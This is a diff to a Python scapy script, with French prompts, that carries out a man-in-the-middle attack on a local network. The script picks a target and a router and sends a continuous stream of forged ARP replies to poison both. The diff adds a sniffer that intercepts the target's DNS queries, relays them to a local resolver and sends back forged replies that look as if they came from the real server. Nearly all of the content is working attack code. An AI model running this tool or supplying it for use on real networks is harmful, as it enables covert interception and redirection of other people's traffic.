@@ -1,5 +1,7 @@
 from ipaddress import IPv4Network
 from scapy import all as scapy
+from scapy.layers.inet import IP, UDP
+from scapy.layers.dns import DNS, DNSQR
 from socket import *
 from fcntl import ioctl
 from struct import pack
@@ -25,7 +27,7 @@ def makeARPRequest(ip):
     return answered, unanswered
 
 def dnsSpoofing(targetIP, spoofIP,sourceIP):
-    packet = scapy.IP(dst=targetIP) / scapy.UDP(dport=53) / scapy.DNS(rd=1, qd=scapy.DNSQR(qname='www.google.com'))
+    packet = scapy.IP(dst=targetIP) / scapy.UDP(dport=53) / scapy.DNS(rd=1, qd=scapy.DNSQR(qname='google.com'))
     answer = scapy.sr1(packet)
     answer[scapy.DNS].an = scapy.DNSRR(rrname=answer[scapy.DNSQR].qname, ttl=10, rdata=spoofIP)
     answer[scapy.DNS].ancount = 1
@@ -34,6 +36,15 @@ def dnsSpoofing(targetIP, spoofIP,sourceIP):
     # del answer[scapy.UDP].len
     # del answer[scapy.UDP].chksum
     return answer
+
+def forwardDnsSpoofing():
+    def forwardDNS(orgPacket: IP):
+        packet = scapy.IP(dst='127.0.0.1') / scapy.UDP(sport=orgPacket[UDP].sport) / scapy.DNS(rd=1, id=orgPacket[DNS].id, qd=DNSQR(qname=orgPacket[DNSQR].qname), verbose=0)
+        answer = scapy.sr1(packet)
+        responsePacket = IP(dst=orgPacket[IP].src, src=orgPacket[IP].dst) / UDP(dport=orgPacket[UDP].sport, sport=53) / DNS()
+        responsePacket[DNS] = answer[DNS]
+        scapy.send(responsePacket, verbose=0)
+    return forwardDNS
 
 def main():
     interface = interfaceChecker()
@@ -58,11 +69,10 @@ def main():
     routeur=input('Entrez le numéro du routeur : ')
     routeur=pcs[int(routeur)-1]
     print('Vous avez choisi : ' + routeur[0] + ' ' + routeur[1])
-    dnsResponse=dnsSpoofing(myIp, myIp,routeur[1])
+    scapy.AsyncSniffer(prn=forwardDnsSpoofing(), filter='udp port 53 and not ip dst 127.0.0.1', iface=interface).start()
     while True:
         scapy.send(scapy.ARP(op=2, pdst=cible[1], hwdst=cible[0], psrc=routeur[1], hwsrc=myMac), verbose=0)
         scapy.send(scapy.ARP(op=2, pdst=routeur[1], hwdst=routeur[0], psrc=cible[1], hwsrc=myMac), verbose=0)
-        scapy.send(dnsResponse, verbose=0)        
 
 if __name__ == '__main__':
     main()
